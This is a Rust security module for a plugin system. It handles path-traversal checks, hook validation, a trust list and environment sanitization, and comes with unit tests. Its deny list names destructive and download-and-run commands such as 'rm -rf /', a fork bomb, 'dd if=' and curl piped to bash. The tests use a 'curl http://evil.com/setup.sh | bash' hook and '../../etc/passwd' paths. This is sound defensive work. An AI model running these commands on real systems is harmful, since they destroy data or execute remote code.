//! Plugin security: path traversal checks, hook validation, env sanitization, trust.

use crate::manifest::PluginManifest;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, thiserror::Error)]
pub enum SecurityError {
    #[error("path traversal detected: entry '{0}' escapes plugin directory")]
    PathTraversal(String),
    #[error("entry file not found: {0}")]
    EntryNotFound(String),
    #[error("entry is not a regular file: {0}")]
    EntryNotFile(String),
    #[error("dangerous hook detected: {0}")]
    DangerousHook(String),
}

/// Validate a plugin before loading.
pub fn validate_plugin(manifest: &PluginManifest, base_dir: &Path) -> Result<(), SecurityError> {
    validate_entry_path(manifest, base_dir)?;
    validate_hooks(manifest)?;
    Ok(())
}

/// Check that entry path doesn't escape the plugin directory.
fn validate_entry_path(manifest: &PluginManifest, base_dir: &Path) -> Result<(), SecurityError> {
    let entry = manifest.runtime.resolve_entry(base_dir);

    if entry.starts_with('/') || entry.starts_with('\\') {
        return Err(SecurityError::PathTraversal(entry.clone()));
    }
    if entry.contains("..") {
        return Err(SecurityError::PathTraversal(entry.clone()));
    }

    let resolved = base_dir.join(&entry);
    let canonical_base = base_dir
        .canonicalize()
        .unwrap_or_else(|_| base_dir.to_path_buf());
    let canonical_entry = resolved
        .canonicalize()
        .map_err(|_| SecurityError::EntryNotFound(resolved.display().to_string()))?;

    if !canonical_entry.starts_with(&canonical_base) {
        return Err(SecurityError::PathTraversal(entry.clone()));
    }
    if !canonical_entry.is_file() {
        return Err(SecurityError::EntryNotFile(
            canonical_entry.display().to_string(),
        ));
    }

    Ok(())
}

/// Check hooks for dangerous commands.
fn validate_hooks(manifest: &PluginManifest) -> Result<(), SecurityError> {
    let dangerous_exact = [
        "rm -rf /",
        "rm -rf ~",
        "rm -rf $HOME",
        "eval $(curl",
        "eval $(wget",
        "> /dev/sda",
        "mkfs.",
        "dd if=",
        ":(){ :|:& };:",
        "chmod -R 777 /",
    ];

    let dangerous_pairs: &[(&str, &str)] = &[
        ("curl", "| bash"),
        ("curl", "| sh"),
        ("wget", "| bash"),
        ("wget", "| sh"),
    ];

    let hooks = [
        (
            "on_install",
            manifest
                .hooks
                .as_ref()
                .and_then(|h| h.on_install.as_deref()),
        ),
        (
            "on_update",
            manifest.hooks.as_ref().and_then(|h| h.on_update.as_deref()),
        ),
        (
            "on_remove",
            manifest.hooks.as_ref().and_then(|h| h.on_remove.as_deref()),
        ),
    ];

    for (hook_name, hook_cmd) in &hooks {
        if let Some(cmd) = hook_cmd {
            let lower = cmd.to_lowercase();
            for pattern in &dangerous_exact {
                if lower.contains(&pattern.to_lowercase()) {
                    return Err(SecurityError::DangerousHook(format!(
                        "{hook_name}: contains '{pattern}'"
                    )));
                }
            }
            for (left, right) in dangerous_pairs {
                if lower.contains(*left) && lower.contains(*right) {
                    return Err(SecurityError::DangerousHook(format!(
                        "{hook_name}: contains '{left} ... {right}'"
                    )));
                }
            }
        }
    }

    Ok(())
}

// --- Trust management ---

fn trust_file(lowfat_home: &Path) -> PathBuf {
    lowfat_home.join("trusted.toml")
}

pub fn is_trusted(plugin_name: &str, lowfat_home: &Path) -> bool {
    let path = trust_file(lowfat_home);
    if let Ok(content) = fs::read_to_string(&path) {
        content.lines().any(|line| line.trim() == plugin_name)
    } else {
        false
    }
}

pub fn trust_plugin(plugin_name: &str, lowfat_home: &Path) -> anyhow::Result<()> {
    let path = trust_file(lowfat_home);
    let mut content = fs::read_to_string(&path).unwrap_or_else(|_| "[trusted]\n".to_string());
    if !content.lines().any(|l| l.trim() == plugin_name) {
        content.push_str(&format!("{plugin_name}\n"));
        fs::create_dir_all(lowfat_home)?;
        fs::write(&path, content)?;
    }
    Ok(())
}

pub fn untrust_plugin(plugin_name: &str, lowfat_home: &Path) -> anyhow::Result<()> {
    let path = trust_file(lowfat_home);
    if let Ok(content) = fs::read_to_string(&path) {
        let filtered: Vec<&str> = content
            .lines()
            .filter(|l| l.trim() != plugin_name)
            .collect();
        fs::write(&path, filtered.join("\n") + "\n")?;
    }
    Ok(())
}

// --- Environment sanitization ---

const SAFE_ENV_VARS: &[&str] = &[
    "LOWFAT_LEVEL",
    "LOWFAT_COMMAND",
    "LOWFAT_SUBCOMMAND",
    "LOWFAT_EXIT_CODE",
    "PATH",
    "HOME",
    "USER",
    "SHELL",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TERM",
    "TMPDIR",
    "GIT_DIR",
    "GIT_WORK_TREE",
    "DOCKER_HOST",
    "KUBECONFIG",
    "GOPATH",
    "GOROOT",
    "CARGO_HOME",
    "RUSTUP_HOME",
    "NODE_PATH",
    "NPM_CONFIG_PREFIX",
    "VIRTUAL_ENV",
    "PYTHONPATH",
];

pub fn sanitized_env() -> Vec<(String, String)> {
    let safe: HashSet<&str> = SAFE_ENV_VARS.iter().copied().collect();
    std::env::vars()
        .filter(|(k, _)| safe.contains(k.as_str()))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::PluginManifest;

    fn minimal_manifest(entry: &str) -> PluginManifest {
        let toml = format!(
            r#"
[plugin]
name = "test"
commands = ["test"]

[runtime]
type = "shell"
entry = "{entry}"
"#
        );
        PluginManifest::parse(&toml).unwrap()
    }

    #[test]
    fn path_traversal_dotdot() {
        let m = minimal_manifest("../../etc/passwd");
        let result = validate_entry_path(&m, Path::new("/tmp/plugin"));
        assert!(result.is_err());
    }

    #[test]
    fn path_traversal_absolute() {
        let m = minimal_manifest("/etc/passwd");
        let result = validate_entry_path(&m, Path::new("/tmp/plugin"));
        assert!(result.is_err());
    }

    #[test]
    fn path_valid_relative() {
        let tmp = tempfile::tempdir().unwrap();
        let filter_path = tmp.path().join("filter.sh");
        fs::write(&filter_path, "#!/bin/sh\ncat").unwrap();

        let m = minimal_manifest("filter.sh");
        let result = validate_entry_path(&m, tmp.path());
        assert!(result.is_ok());
    }

    #[test]
    fn dangerous_hook_rm_rf() {
        let toml = r#"
[plugin]
name = "evil"
commands = ["test"]

[runtime]
type = "shell"
entry = "filter.sh"

[hooks]
on_install = "rm -rf /"
"#;
        let m = PluginManifest::parse(toml).unwrap();
        assert!(validate_hooks(&m).is_err());
    }

    #[test]
    fn dangerous_hook_curl_pipe() {
        let toml = r#"
[plugin]
name = "evil"
commands = ["test"]

[runtime]
type = "shell"
entry = "filter.sh"

[hooks]
on_install = "curl http://evil.com/setup.sh | bash"
"#;
        let m = PluginManifest::parse(toml).unwrap();
        assert!(validate_hooks(&m).is_err());
    }

    #[test]
    fn safe_hooks() {
        let toml = r#"
[plugin]
name = "safe"
commands = ["test"]

[runtime]
type = "shell"
entry = "filter.sh"

[hooks]
on_install = "chmod +x filter.sh"
"#;
        let m = PluginManifest::parse(toml).unwrap();
        assert!(validate_hooks(&m).is_ok());
    }

    #[test]
    fn env_sanitization() {
        let env = sanitized_env();
        let keys: HashSet<String> = env.iter().map(|(k, _)| k.clone()).collect();
        assert!(!keys.contains("AWS_SECRET_ACCESS_KEY"));
        assert!(!keys.contains("GITHUB_TOKEN"));
    }

    #[test]
    fn trust_workflow() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(!is_trusted("my-plugin", tmp.path()));
        trust_plugin("my-plugin", tmp.path()).unwrap();
        assert!(is_trusted("my-plugin", tmp.path()));
        untrust_plugin("my-plugin", tmp.path()).unwrap();
        assert!(!is_trusted("my-plugin", tmp.path()));
    }
}
